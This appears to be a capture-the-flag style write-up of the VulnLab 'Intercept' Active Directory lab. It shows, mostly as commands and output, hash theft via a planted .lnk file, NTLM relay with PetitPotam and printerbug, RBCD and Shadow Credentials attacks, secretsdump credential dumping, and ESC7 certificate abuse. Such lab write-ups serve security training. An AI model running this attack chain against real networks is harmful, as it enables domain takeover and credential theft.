---
title: VulnLab Intercept
description: VulnLab Intercept
image:
  path: intercept.png
categories:
- VulnLab Chains
- Active Directory
layout: post
media_subpath: /assets/posts/labs/vulnlab/chains/intercept
tags:
- vulnlab-chains
- active-directory
---
# Intercept
## Recon
```
10.10.192.149 -> [53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389]
10.10.192.150 -> [135,139,445,3389,7680]

```
```
└─$ nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389 10.10.192.149        
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 20:40 +05
Nmap scan report for 10.10.192.149
Host is up (0.14s latency).

PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-01-18 15:39:23Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2024-07-17T15:52:02
|_Not valid after:  2025-07-17T15:52:02
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2024-07-17T15:52:02
|_Not valid after:  2025-07-17T15:52:02
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2024-07-17T15:52:02
|_Not valid after:  2025-07-17T15:52:02
|_ssl-date: TLS randomness does not represent time
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intercept.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.intercept.vl
| Not valid before: 2024-07-17T15:52:02
|_Not valid after:  2025-07-17T15:52:02
|_ssl-date: TLS randomness does not represent time
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=DC01.intercept.vl
| Not valid before: 2025-01-17T15:33:34
|_Not valid after:  2025-07-19T15:33:34
| rdp-ntlm-info: 
|   Target_Name: INTERCEPT
|   NetBIOS_Domain_Name: INTERCEPT
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: intercept.vl
|   DNS_Computer_Name: DC01.intercept.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-01-18T15:40:05+00:00
|_ssl-date: 2025-01-18T15:40:44+00:00; -1m20s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp open  mc-nmf        .NET Message Framing
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -1m20s, deviation: 0s, median: -1m20s
| smb2-time: 
|   date: 2025-01-18T15:40:08
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.17 seconds
```
```
└─$ nmap -sC -sV -p135,139,445,3389,7680 10.10.192.150
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-18 20:42 +05
Nmap scan report for 10.10.192.150
Host is up (0.13s latency).

PORT     STATE    SERVICE       VERSION
135/tcp  open     msrpc         Microsoft Windows RPC
139/tcp  open     netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open     microsoft-ds?
3389/tcp open     ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WS01.intercept.vl
| Not valid before: 2025-01-17T15:33:41
|_Not valid after:  2025-07-19T15:33:41
|_ssl-date: 2025-01-18T15:42:10+00:00; -1m21s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INTERCEPT
|   NetBIOS_Domain_Name: INTERCEPT
|   NetBIOS_Computer_Name: WS01
|   DNS_Domain_Name: intercept.vl
|   DNS_Computer_Name: WS01.intercept.vl
|   DNS_Tree_Name: intercept.vl
|   Product_Version: 10.0.19041
|_  System_Time: 2025-01-18T15:41:30+00:00
7680/tcp filtered pando-pub
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-01-18T15:41:33
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: -1m21s, deviation: 0s, median: -1m21s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.37 seconds
```
## WS01.intercept.vl
We can start enumerating shares on targets
```
└─$ nxc smb targets.txt -u 'Guest' -p '' --shares   
SMB         10.10.192.150   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)
SMB         10.10.192.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
SMB         10.10.192.150   445    WS01             [+] intercept.vl\Guest: 
SMB         10.10.192.149   445    DC01             [-] intercept.vl\Guest: STATUS_ACCOUNT_DISABLED 
SMB         10.10.192.150   445    WS01             [*] Enumerated shares
SMB         10.10.192.150   445    WS01             Share           Permissions     Remark
SMB         10.10.192.150   445    WS01             -----           -----------     ------
SMB         10.10.192.150   445    WS01             ADMIN$                          Remote Admin
SMB         10.10.192.150   445    WS01             C$                              Default share
SMB         10.10.192.150   445    WS01             dev             READ,WRITE      shared developer workspace
SMB         10.10.192.150   445    WS01             IPC$            READ            Remote IPC
SMB         10.10.192.150   445    WS01             Users           READ            
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```
We have 2 interesting shares: `Users` and `dev`
```
└─$ smbclient.py Guest:''@10.10.192.150                          
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
<SNIP>
# use dev
# ls
drw-rw-rw-          0  Sat Jan 18 20:45:38 2025 .
drw-rw-rw-          0  Sat Jan 18 20:45:38 2025 ..
drw-rw-rw-          0  Thu Jun 29 17:57:25 2023 projects
-rw-rw-rw-        123  Thu Jun 29 17:46:20 2023 readme.txt
drw-rw-rw-          0  Thu Jun 29 17:51:17 2023 tools
# cat readme.txt
Please check this share regularly for updates to the application (this is a temporary solution until we switch to gitlab).
```
`readme.txt` indicates that there are users that occassionally visit this share. Since we have write privileges, we can try stealing hash by placing some [malicious files](https://github.com/Greenwolf/ntlm_theft)
```
└─$ python3 ~/tools/red-team/ntlm_theft/ntlm_theft.py -g lnk -s 10.8.4.147 -f intercept
Created: intercept/intercept.lnk (BROWSE TO FOLDER)
Generation Complete.

```
```
# put intercept/intercept.lnk
# 
```

![](1.png)

Let's try cracking it
```
└─$ hashcat -m 5600 -a 0 hash /usr/share/wordlists/rockyou.txt   
hashcat (v6.2.6) starting
<SNIP>
KATHRYN.SPENCER::INTERCEPT:40075f5942686eec:5613220c96dc6971fbb66bf485a07792:01010000000000000009cbeaea69db01d827c8a4a8670c630000000002000800430048005500570001001e00570049004e002d005300330036003800360046003400310056005800330004003400570049004e002d00530033003600380036004600340031005600580033002e0043004800550057002e004c004f00430041004c000300140043004800550057002e004c004f00430041004c000500140043004800550057002e004c004f00430041004c00070008000009cbeaea69db0106000400020000000800300030000000000000000000000000200000490d82747a4c21c0e7d574b167df7f1240879f23316baf14be1836093ee6b2ce0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e0038002e0034002e003100340037000000000000000000:<REDACTED>
<SNIP>

```
```
└─$ nxc smb 10.10.192.149 -u 'Kathryn.Spencer' -p '<REDACTED>'
SMB         10.10.192.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
SMB         10.10.192.149   445    DC01             [+] intercept.vl\Kathryn.Spencer:<REDACTED> 
```

Capture domain information with bloodhound
```
└─$ bloodhound-python -d 'intercept.vl' -u 'Kathryn.Spencer' -p '<REDACTED>' -c all -ns 10.10.192.149 --zip
INFO: Found AD domain: intercept.vl
<SNIP>
```
Noting interesting, let's also check ADCS, since there are `Cert Publishers` group 
```
└─$ certipy find -dc-ip 10.10.192.149 -u 'Kathryn.Spencer@intercept.vl' -p '<REDACTED>' -stdout            
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'intercept-DC01-CA' via CSRA
[!] Got error while trying to get CA configuration for 'intercept-DC01-CA' via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
[*] Trying to get CA configuration for 'intercept-DC01-CA' via RRP
[*] Got CA configuration for 'intercept-DC01-CA'
[*] Enumeration output:
Certificate Authorities
<SNIP>
Certificate Authorities
  0
    CA Name                             : intercept-DC01-CA
    DNS Name                            : DC01.intercept.vl
    Certificate Subject                 : CN=intercept-DC01-CA, DC=intercept, DC=vl
    Certificate Serial Number           : 5A5362AC7481B28B44A282C2A974CF75
    Certificate Validity Start          : 2023-06-27 13:24:59+00:00
    Certificate Validity End            : 2125-01-18 15:41:44+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : INTERCEPT.VL\Administrators
      Access Rights
        Enroll                          : INTERCEPT.VL\Authenticated Users
        ManageCa                        : INTERCEPT.VL\ca-managers
                                          INTERCEPT.VL\Domain Admins
                                          INTERCEPT.VL\Enterprise Admins
                                          INTERCEPT.VL\Administrators
        ManageCertificates              : INTERCEPT.VL\Domain Admins
                                          INTERCEPT.VL\Enterprise Admins
                                          INTERCEPT.VL\Administrators
<SNIP>
```
We see `ca-managers` group who can manage CA. But it's no use right now. Only information we have is that `Vincent.Woods` is a member of this group. Plus, he has `AllExtendedRights` over WS01

![](2.png)

Let's continue enumeration. Since we have 2 boxes, we might also check for [NTLM relay attacks](https://www.thehacker.recipes/ad/movement/ntlm/relay). To protect against NTLM relay, it has to be enabled on the target server side and we saw that SMB signing is required on DC01, but seems like LDAP is not (which is default)
```
└─$ nxc ldap 10.10.192.149 -u 'Kathryn.Spencer' -p '<REDACTED>' -M ldap-checker

LDAP        10.10.192.149   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:intercept.vl)
LDAP        10.10.192.149   389    DC01             [+] intercept.vl\Kathryn.Spencer:<REDACTED> 
LDAP-CHE... 10.10.192.149   389    DC01             LDAP Signing NOT Enforced!
LDAP-CHE... 10.10.192.149   389    DC01             LDAPS Channel Binding is set to "NEVER"
```

We can relay to LDAP from WebDAV

![](3.png)

And it seems like WS01 has it enabled
```
└─$ nxc smb targets.txt -u 'Kathryn.Spencer' -p '<REDACTED>' -M webdav 
SMB         10.10.192.149   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:intercept.vl) (signing:True) (SMBv1:False)
SMB         10.10.192.150   445    WS01             [*] Windows 10 / Server 2019 Build 19041 x64 (name:WS01) (domain:intercept.vl) (signing:False) (SMBv1:False)
SMB         10.10.192.149   445    DC01             [+] intercept.vl\Kathryn.Spencer:<REDACTED> 
SMB         10.10.192.150   445    WS01             [+] intercept.vl\Kathryn.Spencer:<REDACTED> 
WEBDAV      10.10.192.150   445    WS01             WebClient Service enabled on: 10.10.192.150
Running nxc against 2 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00

```

We need to add DNS entry that points to our host
```
└─$ python3 ~/tools/red-team/krbrelayx/dnstool.py -u 'intercept.vl\Kathryn.Spencer' -p <REDACTED> -a add -d 10.8.4.147 -r pentest.intercept.vl dc01.intercept.vl -dc-ip 10.10.192.149 -dns-ip 10.10.192.149
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```
For coercion we can use `PetitPotam` or `printerbug`
```
┌──(kali㉿kali)-[~/vulnlab/chains/intercept]
└─$ python3 ~/tools/red-team/PetitPotam/PetitPotam.py -u 'Kathryn.Spencer' -p '<REDACTED>' -d intercept.vl 'pentest@80/a' 10.10.192.150
```
```
└─$ python3 ~/tools/red-team/krbrelayx/printerbug.py intercept.vl/Kathryn.Spencer:<REDACTED>@10.10.192.150 'pentest@80/a'                                                                     
[*] Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
```

We can perform [RBCD](#rbcd) or [Shadow Credentials attack](#shadow-creds).

### RBCD
For RBCD, we need to be able to add computer to domain, which we can
```
└─$ nxc ldap dc01.intercept.vl -u 'Kathryn.Spencer' -p '<REDACTED>' -M maq              
LDAP        10.10.192.149   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:intercept.vl)
LDAP        10.10.192.149   389    DC01             [+] intercept.vl\Kathryn.Spencer:<REDACTED> 
MAQ         10.10.192.149   389    DC01             [*] Getting the MachineAccountQuota
MAQ         10.10.192.149   389    DC01             MachineAccountQuota: 10
```
```
└─$ addcomputer.py -computer-name 'PWNED$' -computer-pass 'ComputerPass123' -dc-ip 10.10.192.149 'intercept.vl/Kathryn.Spencer':'<REDACTED>'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Successfully added machine account PWNED$ with password ComputerPass123.
```
```
└─$ iconv -f ASCII -t UTF-16LE <(printf "ComputerPass123") | openssl dgst -md4  
MD4(stdin)= fa0c39088858443e31cf449a9da745ba
```


Now start `ntlmrelayx`
```
└─$ ntlmrelayx.py -t  ldap://10.10.192.149 --shadow-credentials --shadow-target 'ws01$' --no-dump --no-da 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

```

Perform coersion using `PetitPotam` or `printerbug`
```
└─$ ntlmrelayx.py -t  ldap://intercept.vl\\'WS01$'@10.10.192.149 -smb2support --delegate-access --no-dump --no-acl --no-da --escalate-user 'PWNED$' --http-port 80  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
<SNIP>
[*] HTTPD(80): Connection from 10.10.188.102 controlled, attacking target ldaps://dc01.intercept.vl
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] HTTPD(80): Authenticating against ldaps://dc01.intercept.vl as INTERCEPT/WS01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] All targets processed!
[*] HTTPD(80): Connection from 10.10.188.102 controlled, but there are no more targets left!
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] All targets processed!
[*] HTTPD(80): Connection from 10.10.188.102 controlled, but there are no more targets left!
[*] HTTPD(80): Client requested path: /a/pipe
[*] HTTPD(80): Client requested path: /a/pipe
[*] All targets processed!
[*] HTTPD(80): Connection from 10.10.188.102 controlled, but there are no more targets left!
[*] Delegation rights modified succesfully!
[*] PWNED$ can now impersonate users on WS01$ via S4U2Proxy

```

Get ticket
```
└─$ getST.py -spn cifs/ws01.intercept.vl intercept.vl/'PWNED$':'ComputerPass123' -impersonate administrator  -dc-ip 10.10.188.101
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in administrator@cifs_ws01.intercept.vl@INTERCEPT.VL.ccache
```

### Shadow Creds
We can also perform Shadow Credentials attack:
- https://www.fortalicesolutions.com/posts/shadow-credentials-workstation-takeover-edition
- https://github.com/dirkjanm/PKINITtools/tree/master

Deploy `ntlmrelayx` with `--shadow-credentials --shadow-target` and coerce using `PetitPotam` or `printerbug`
```
└─$ ntlmrelayx.py -t ldap://dc01.intercept.vl --shadow-credentials --shadow-target 'ws01$' --no-dump --no-da  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server on port 445
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server on port 9389
[*] Setting up RAW Server on port 6666
[*] Multirelay disabled

[*] Servers started, waiting for connections
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] HTTPD(80): Connection from 10.10.188.102 controlled, attacking target ldap://dc01.intercept.vl
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] HTTPD(80): Authenticating against ldap://dc01.intercept.vl as INTERCEPT/WS01$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] All targets processed!
[*] HTTPD(80): Connection from 10.10.188.102 controlled, but there are no more targets left!
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] HTTPD(80): Client requested path: /a/pipe/spoolss
[*] All targets processed!
[*] HTTPD(80): Connection from 10.10.188.102 controlled, but there are no more targets left!
[*] HTTPD(80): Client requested path: /a/pipe
[*] HTTPD(80): Client requested path: /a/pipe
[*] All targets processed!
[*] HTTPD(80): Connection from 10.10.188.102 controlled, but there are no more targets left!
[*] Searching for the target account
[*] Target user found: CN=WS01,CN=Computers,DC=intercept,DC=vl
[*] Generating certificate
[*] Certificate generated
[*] Generating KeyCredential
[*] Updating the msDS-KeyCredentialLink attribute of ws01$
[*] Updated the msDS-KeyCredentialLink attribute of the target object
[*] Saved PFX (#PKCS12) certificate & key at path: 6nMnLWWH.pfx
[*] Must be used with password: EOWdp82RtSQtCjYAh7pV
[*] A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools
[*] Run the following command to obtain a TGT
[*] python3 PKINITtools/gettgtpkinit.py -cert-pfx 6nMnLWWH.pfx -pfx-pass EOWdp82RtSQtCjYAh7pV intercept.vl/ws01$ 6nMnLWWH.ccache
```

Get TGT using certificate
```
└─$ python3 ~/tools/red-team/PKINITtools/gettgtpkinit.py -cert-pfx 6nMnLWWH.pfx -pfx-pass EOWdp82RtSQtCjYAh7pV intercept.vl/ws01$ 6nMnLWWH.ccache
2025-01-19 14:44:44,356 minikerberos INFO     Loading certificate and key from file
INFO:minikerberos:Loading certificate and key from file
2025-01-19 14:44:44,367 minikerberos INFO     Requesting TGT
INFO:minikerberos:Requesting TGT
2025-01-19 14:44:58,175 minikerberos INFO     AS-REP encryption key (you might need this later):
INFO:minikerberos:AS-REP encryption key (you might need this later):
2025-01-19 14:44:58,175 minikerberos INFO     5dce37586265b354cb8e046f46b6a2ec3c1ac8b81c18a3bc2167b3b45e50f1ce
INFO:minikerberos:5dce37586265b354cb8e046f46b6a2ec3c1ac8b81c18a3bc2167b3b45e50f1ce
2025-01-19 14:44:58,178 minikerberos INFO     Saved TGT to file
INFO:minikerberos:Saved TGT to file
```

Get ticket
```
└─$ python3 ~/tools/red-team/PKINITtools/gets4uticket.py kerberos+ccache://intercept.vl\\ws01\$:6nMnLWWH.ccache@dc01.intercept.vl cifs/ws01.intercept.vl@intercept.vl administrator@intercept.vl administrator_ws01.ccache -v
2025-01-19 14:54:14,856 minikerberos INFO     Trying to get SPN with administrator@intercept.vl for cifs/ws01.intercept.vl@intercept.vl
INFO:minikerberos:Trying to get SPN with administrator@intercept.vl for cifs/ws01.intercept.vl@intercept.vl
2025-01-19 14:54:15,052 minikerberos INFO     Success!
INFO:minikerberos:Success!
2025-01-19 14:54:15,052 minikerberos INFO     Done!
INFO:minikerberos:Done!
```
or get NT hash and use it to acquire ticket
```
└─$ KRB5CCNAME=6nMnLWWH.ccache python3 ~/tools/red-team/PKINITtools/getnthash.py -key 5dce37586265b354cb8e046f46b6a2ec3c1ac8b81c18a3bc2167b3b45e50f1ce intercept.vl/ws01\$
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Using TGT from cache
/home/kali/tools/red-team/PKINITtools/getnthash.py:144: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow()
/home/kali/tools/red-team/PKINITtools/getnthash.py:192: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[*] Requesting ticket to self with PAC
Recovered NT Hash
<REDACTED>
```
```
└─$ ticketer.py -nthash '<REDACTED>' -domain-sid S-1-5-21-3031021547-1480128195-3014128932 -domain intercept.vl -dc-ip 10.10.188.101 -spn cifs/ws01.intercept.vl administrator
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for intercept.vl/administrator
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in administrator.ccache
```

### Continuation

```
└─$ KRB5CCNAME=administrator@cifs_ws01.intercept.vl@INTERCEPT.VL.ccache secretsdump.py -k -no-pass ws01.intercept.vl 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x04718518c7f81484a5ba5cc7f16ca912
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
<SNIP>
INTERCEPT\WS01$:aad3b435b51404eeaad3b435b51404ee:<REDACTED>:::
[*] DefaultPassword 
intercept.vl\Kathryn.Spencer:<REDACTED>
[*] DPAPI_SYSTEM 
dpapi_machinekey:0xf6f65580470c139808ab7f0ffb709773d1531dc3
dpapi_userkey:0x24122e60857c28b7f2e6bdd138f22e3e4ddd58f3
[*] NL$KM 
 0000   4C A8 6F 51 3B B6 E6 22  0B A7 7A FD 4F 32 EA BC   L.oQ;.."..z.O2..
 0010   78 7A 98 1E DD 83 F2 70  37 73 9B 6C D0 03 9B 7F   xz.....p7s.l....
 0020   FA EA 8D AF A0 84 F9 0D  24 17 3C C9 97 3D 8A E7   ........$.<..=..
 0030   BC EE 5D B7 20 73 02 B7  E1 A7 62 E6 4D 8E F8 ED   ..]. s....b.M...
NL$KM:4ca86f513bb6e6220ba77afd4f32eabc787a981edd83f27037739b6cd0039b7ffaea8dafa084f90d24173cc9973d8ae7bcee5db7207302b7e1a762e64d8ef8ed
[*] _SC_HelpdeskService 
Simon.Bowen@intercept.vl:<REDACTED>
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```
## DC01.intercept.vl

Now we have creds for `Simon.Bowen` who has `GenericAll` over `CA-Managers`

![](4.png)

We can add members to group and remember that continue
```
└─$ powerview Simon.Bowen:'<REDACTED>'@intercept.vl -q "Add-DomainGroupMember -Identity ca-managers -Members simon.bowen"

Logging directory is set to /home/kali/.powerview/logs/simon.bowen-intercept.vl
[2025-01-19 15:20:10] User simon.bowen successfully added to ca-managers

```

Now, if we run certipy, we should see ESC7
```
└─$ certipy find -dc-ip 10.10.188.101 -u Simon.Bowen@intercept.vl -p '<REDACTED>' -stdout -vulnerable
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Trying to get CA configuration for 'intercept-DC01-CA' via CSRA
[*] Got CA configuration for 'intercept-DC01-CA'
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : intercept-DC01-CA
    DNS Name                            : DC01.intercept.vl
    Certificate Subject                 : CN=intercept-DC01-CA, DC=intercept, DC=vl
    Certificate Serial Number           : 7FDE03B2759C849E47F562DED08D8812
    Certificate Validity Start          : 2023-06-27 13:24:59+00:00
    Certificate Validity End            : 2125-01-19 08:53:46+00:00
    Web Enrollment                      : Disabled
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Permissions
      Owner                             : INTERCEPT.VL\Administrators
      Access Rights
        Enroll                          : INTERCEPT.VL\Authenticated Users
        ManageCa                        : INTERCEPT.VL\ca-managers
                                          INTERCEPT.VL\Domain Admins
                                          INTERCEPT.VL\Enterprise Admins
                                          INTERCEPT.VL\Administrators
        ManageCertificates              : INTERCEPT.VL\Domain Admins
                                          INTERCEPT.VL\Enterprise Admins
                                          INTERCEPT.VL\Administrators
    [!] Vulnerabilities
      ESC7                              : 'INTERCEPT.VL\\ca-managers' has dangerous permissions
Certificate Templates                   : [!] Could not find any certificate templates

```

The steps we need to do for [ESC7](https://www.thehacker.recipes/ad/movement/adcs/access-controls#esc7-abusing-subca):
- Add user to officer
- Enable SubCA Certificate
- Issue a failed request (need ManageCA and ManageCertificates rights for a failed request)
- Retrieve an issued certificate


```
└─$ certipy ca -dc-ip 10.10.188.101 -u Simon.Bowen@intercept.vl -p '<REDACTED>' -ca intercept-DC01-CA -add-officer Simon.Bowen
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully added officer 'Simon.Bowen' on 'intercept-DC01-CA'
```
```
└─$ certipy ca -dc-ip 10.10.188.101 -u Simon.Bowen@intercept.vl -p '<REDACTED>' -ca intercept-DC01-CA -enable-template 'SubCA'
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully enabled 'SubCA' on 'intercept-DC01-CA'

```

Now request the certificate, it will fail. That's okay, we will issue it
```
└─$ certipy req -dc-ip 10.10.188.101 -u Simon.Bowen@intercept.vl -p '<REDACTED>' -ca intercept-DC01-CA -template SubCA -upn administrator@intercept.vl
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[-] Got error while trying to request certificate: code: 0x80094012 - CERTSRV_E_TEMPLATE_DENIED - The permissions on the certificate template do not allow the current user to enroll for this type of certificate.
[*] Request ID is 5
Would you like to save the private key? (y/N) y
[*] Saved private key to 5.key
[-] Failed to request certificate
```

```
└─$ certipy ca -dc-ip 10.10.188.101 -u Simon.Bowen@intercept.vl -p '<REDACTED>' -ca intercept-DC01-CA -issue-request 5 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Successfully issued certificate
```

Now, retrieve certificate
```
└─$ certipy req -dc-ip 10.10.188.101 -u Simon.Bowen@intercept.vl -p '<REDACTED>' -ca intercept-DC01-CA -retrieve 5                                    
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 5
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@intercept.vl'
[*] Certificate has no object SID
[*] Loaded private key from '5.key'
[*] Saved certificate and private key to 'administrator.pfx'
```
Retrieve hash
```
└─$ certipy auth -pfx administrator.pfx -username administrator -domain intercept.vl -dc-ip 10.10.188.101   
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: administrator@intercept.vl
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@intercept.vl': aad3b435b51404eeaad3b435b51404ee:<REDACTED>
```

[https://api.vulnlab.com/api/v1/share?id=422c5822-c143-4180-bb01-7abe5ae23ec5](https://api.vulnlab.com/api/v1/share?id=422c5822-c143-4180-bb01-7abe5ae23ec5)


